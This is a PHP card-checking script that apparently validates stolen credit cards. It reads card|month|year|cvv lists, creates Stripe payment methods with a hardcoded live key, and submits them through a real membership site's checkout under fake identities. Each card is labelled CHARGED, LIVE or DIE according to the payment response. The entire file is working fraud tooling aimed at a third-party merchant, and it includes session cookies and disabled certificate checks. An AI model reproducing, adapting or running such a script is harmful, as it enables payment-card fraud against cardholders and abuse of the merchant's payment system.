<?php 


//••••NONSK INFO•••••//
$amt = "45";
$sitename = "https://www.legalsciences.com/membership/checkout/"; //••••optional••••//

error_reporting(0);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
//------ESSENTIAL FUNCTION THAT NEEDED----//
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function random_strings($length_of_string) 
{$str_result = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'; 
    return substr(str_shuffle($str_result),   0, $length_of_string); 
}

$mail = 'mtctechx'.random_strings(4).'';
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
//----------------- 1 REQ-----------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'cookie: ',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

//--------------1REQ POSTFIRLDS-----------//

curl_setopt($ch, CURLOPT_POSTFIELDS, '
type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=d5056ffb-fca5-48e6-9882-f5e1cc4e884704aa7d&muid=7f561ba3-cdbb-4b84-ba4c-ae1db70a8d28d20368&sid=7b136da7-8924-46a3-be48-59346e3df5d1f9b5e8&payment_user_agent=stripe.js%2Facd3f7780%3B+stripe-js-v3%2Facd3f7780&time_on_page=13120&key=pk_live_dBeN0lYkAn9okydW7md3YICw');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
//----------------- 2 REQ-----------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.legalsciences.com/membership/checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.legalsciences.com',
'method: POST',
'path: /membership/checkout/',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'cookie: _ga=GA1.1.1201015413.1673179909; pmpro_visit=1; PHPSESSID=af9bfcd94c1fb91e1ea0561b30f79c45; __stripe_mid=5da5375b-5ae7-4aac-97bb-051b6e2b3b7f99f2a2; __stripe_sid=96dd7f36-f394-4f8b-9271-c17092834078d40732; _ga_E4Q1BZTGBC=GS1.1.1673179908.1.1.1673180015.0.0.0
dnt: 1',
'origin: https://www.legalsciences.com',
'referer: https://www.legalsciences.com/membership/checkout/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
   ));

//--------------2REQ POSTFIRLDS-----------//

curl_setopt($ch, CURLOPT_POSTFIELDS,'
level=1&checkjavascript=1&other_discount_code=&username='.$mail.'&password=mainulhasan&password2=mainulhasan&first_name=Alex&last_name=Mahone&bemail='.$mail.'%40gmail.com&bconfirmemail='.$mail.'%40gmail.com&city=NEW+YORK&state=New+York&organization=MTC&law_enforcement=1&law_enforcement_checkbox=1&fullname=&CardType=mastercard&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX7159&ExpirationMonth=03&ExpirationYear=2023');

$result2 = curl_exec($ch);

//----------RESPONSE SECTION START-------//
//------------------PI CHECK ------------//
if(strpos($result2, "payment_intent_unexpected_state")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed </span><br>';

    }
//--------------CHARGED RESPONSE---------//
elseif(strpos($result2, "succeeded")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result: Charged '.$amt.' @mtctechx </span><br>';

}
elseif(strpos($result2, "Thank You")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result: Charged '.$amt.' @mtctechx </span><br>';

}
//--------------LIVE RESPONSE-----------//
elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS @MTCTECHX </span><br>';
    }
  
elseif(strpos($result2, 'security code is incorrect.')) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE @MTCTECHX </span><br>';
    }
    elseif(strpos($result2, "Security code is incorrect")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE @MTCTECHX </span><br>';
    }
    
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: TRANSACTION NOT ALLOWED @MTCTECHX </span><br>';
    }
    

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 3DSECURE REQUIRED @MTCTECHX </span><br>';
    }
//------------DECLINE RESPONSE-----------//
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE</span><br>';
    }

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';

}


elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';

}
elseif(strpos($result2, "intent_confirmation_challenge")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha </span><br>';

    }


elseif(strpos($result2, 'Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Generic Decline </span><br>';

}

else {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Unknown Decline Result1:  Result2: '.$result2.'</span><br>';

}

curl_close($ch);
ob_flush();
//echo $result1;
//echo $result2;